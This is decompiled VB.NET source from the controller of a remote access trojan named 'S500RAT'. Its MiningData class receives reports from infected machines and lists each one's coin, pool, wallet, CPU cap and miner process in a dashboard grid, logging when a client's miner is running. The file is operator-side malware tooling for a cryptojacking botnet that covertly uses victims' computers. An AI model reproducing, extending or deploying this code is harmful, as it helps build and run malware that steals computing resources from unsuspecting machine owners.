Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000065 RID: 101
	Public Class MiningData
		' Token: 0x060011C8 RID: 4552 RVA: 0x0009ED1C File Offset: 0x0009CF1C
		Public Shared Sub AddArray(Client_0 As Clients, unpack_msgpack As MsgPack)
			Dim item As DataGridViewRow = New DataGridViewRow() With { .Height = 30 }
			Try
				Dim flag As Boolean = unpack_msgpack.ForcePathObject("Coin").AsString.Length < 1
				If flag Then
					Return
				End If
				item.Cells.Add(New DataGridViewImageCell() With { .Value = DataB.form1_0.IMAGMiningL1.Images(unpack_msgpack.ForcePathObject("Coin").AsString + ".png"), .ImageLayout = DataGridViewImageCellLayout.Zoom })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("PC").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Windows").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("CPU").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("WorkName").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Pool").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("CPUMax").AsString + "%" })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Process").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Wallet").AsString })
				item.Resizable = DataGridViewTriState.[False]
			Catch ex As Exception
				ListLogs.AddArray("Mining! : " + ex.Message, 0)
				Return
			End Try
			DataB.form1_0.Invoke(New MethodInvoker(Sub()
				Dim lockListMining As Object = Setting.LockListMining
				ObjectFlowControl.CheckForSyncLockOnValueType(lockListMining)
				SyncLock lockListMining
					DataB.form1_0.MiningL1.Rows.Add(item)
					Client_0.MiningDatagridview = item
					Client_0.MiningDatagridview.Tag = Client_0
					DataB.form1_0.NumListMining.Text = Conversions.ToString(DataB.form1_0.MiningL1.Rows.Count) + "+"
					ListLogs.AddArray("Client " + unpack_msgpack.ForcePathObject("PC").AsString + " Mining is working", 3)
				End SyncLock
			End Sub))
		End Sub
	End Class
End Namespace
